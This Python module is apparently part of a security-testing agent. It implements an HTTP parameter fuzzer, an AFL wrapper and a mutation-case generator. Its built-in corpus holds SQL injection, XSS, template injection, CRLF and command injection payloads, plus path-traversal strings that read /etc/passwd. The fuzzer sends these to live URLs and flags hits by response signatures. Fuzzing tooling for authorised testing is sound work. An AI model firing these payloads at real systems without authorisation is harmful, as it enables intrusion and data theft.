"""
Fuzzing capabilities: HTTP parameter fuzzing (payload-mutation driven) and
mutation-case generation for protocol fuzzing. Python-first so it works
without AFL/libFuzzer; external fuzzers are preferred when present.
"""
from __future__ import annotations

import json
import os
import re
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from security_agent.tools.fallback import FallbackRunner, strategy_from_cmd

# Built-in mutation corpus: SQLi, XSS, path traversal, command injection, SSTI, CRLF
MUTATIONS: List[str] = [
    "'", '"', "''", "1' OR '1'='1", "1 OR 1=1--", "1' UNION SELECT NULL--",
    "%27", "%22", "..%2f", "../", "../../etc/passwd", "%2e%2e%2fetc%2fpasswd",
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><svg/onload=alert(1)>",
    "{{7*7}}", "${7*7}", "<%= 7*7 %>",
    ";id", "|id", "& id", "$(id)", "`id`", "%0aid", "127.0.0.1;id",
    "a\r\nX-Injected: yes", "%0d%0aX-Injected:%20yes",
    "AAAA" * 200,
]


def _fuzz_url_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    url = kw.get("url") or ""
    if not url:
        return False, "url required (use FUZZ placeholder or provide param)", ""
    param = kw.get("param")
    custom = kw.get("payloads")
    if custom:
        if os.path.exists(custom):
            with open(custom, "r", errors="replace") as f:
                payloads = [ln.strip() for ln in f if ln.strip()]
        else:
            payloads = [p.strip() for p in str(custom).split(",") if p.strip()]
    else:
        payloads = list(MUTATIONS)
    if param:
        payloads = [param + "=" + p for p in payloads]
    import urllib.request
    results: List[str] = []
    baseline = None
    for i, payload in enumerate(payloads[: int(kw.get("limit", 60))]):
        target = url.replace("FUZZ", urllib.parse.quote(payload, safe=""))
        if param and "=" not in target.split("?", 1)[-1]:
            sep = "&" if "?" in target else "?"
            target = f"{target}{sep}{param}={urllib.parse.quote(payload, safe='')}"
        try:
            req = urllib.request.Request(target, headers={"User-Agent": "buzzard-code-fuzz/1.0"})
            with urllib.request.urlopen(req, timeout=6) as resp:
                body = resp.read().decode("utf-8", "replace")
                st = resp.status
            loc = resp.headers.get("Location", "")
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", "replace")
            st = e.code
            loc = e.headers.get("Location", "")
        except Exception as e:
            results.append(f"{i:03d}  {payload[:40]:<42} ERROR {type(e).__name__}")
            continue
        length = len(body)
        interesting = False
        notes = []
        if i == 0:
            baseline = (st, length, body)
        if st != baseline[0] if baseline else False:
            notes.append("status-diff")
        if length != baseline[1] if baseline else False:
            notes.append("size-diff")
        for sig, label in [
            ("syntax error", "sql-error"), ("mysql", "sql-error"), ("sqlite", "sql-error"),
            ("unterminated", "sql-error"), ("<script>alert(1)</script>", "xss-reflected"),
            ("root:", "lfi-hit"), ("no such file", "lfi-error"), ("uid=", "cmdi-hit"),
            ("not found", "404"), ("traceback", "debug-error"), ("42", "ssti-hit"), ("49", "ssti-hit"),
        ]:
            if sig in body.lower():
                notes.append(label)
        if notes or (st not in (200, 301, 302, 404)):
            interesting = True
        if interesting:
            results.append(f"{i:03d}  {payload[:50]:<52} {st} {length}B {' '.join('[' + n + ']' for n in notes)}")
    if not results:
        return True, "no interesting fuzz responses", f"{len(payloads)} payloads sent, all responses looked normal"
    return True, f"{len(results)} interesting responses", "\n".join(results[:60])


def _fuzz_afl(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    target = kw.get("target_bin")
    if not target:
        return False, "target_bin required for AFL strategy", ""
    outdir = kw.get("outdir", "/tmp/arsenal_afl_out")
    seeds = kw.get("seeds", "/tmp/arsenal_afl_in")
    if not runner.tool_available("afl-fuzz"):
        return False, "afl-fuzz not installed", ""
    cmd = f"timeout {kw.get('duration', 30)} afl-fuzz -i {seeds} -o {outdir} -- {target} @@ 2>&1 | tail -25"
    res = runner.run_cmd(cmd, timeout=int(kw.get("duration", 30)) + 10)
    out = (res.get("stdout") or "").strip()
    if out:
        return True, "afl-fuzz run finished", out
    return False, "no afl output", ""


def fuzz_url_chain() -> List[Tuple[str, Any]]:
    return [("python-http-fuzz", _fuzz_url_py)]


def fuzz_target_chain() -> List[Tuple[str, Any]]:
    return [("afl-fuzz", _fuzz_afl), ("python-http-fuzz", _fuzz_url_py)]


def _fuzz_cases_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    base = kw.get("input") or kw.get("base") or ""
    if base is None:
        return False, "input required", ""
    cases = [base]
    cases += [base + m for m in MUTATIONS[:20]]
    cases += [m + base for m in MUTATIONS[:10]]
    cases += [base.replace("ID", str(i)) for i in (0, 1, -1, 999999999)]
    cases += [base.replace("ID", "' OR '1'='1") if "ID" in base else base + "&debug=1"]
    cases += ["A" * n + base for n in (1000, 10000)]
    lines = [f"{len(cases)} mutation cases generated (base: {base[:60]}):"]
    for i, c in enumerate(cases[:40]):
        lines.append(f"  [{i:03d}] {c[:120]}")
    return True, f"{len(cases)} cases", "\n".join(lines)


def fuzz_cases_chain() -> List[Tuple[str, Any]]:
    return [("python-mutation", _fuzz_cases_py)]
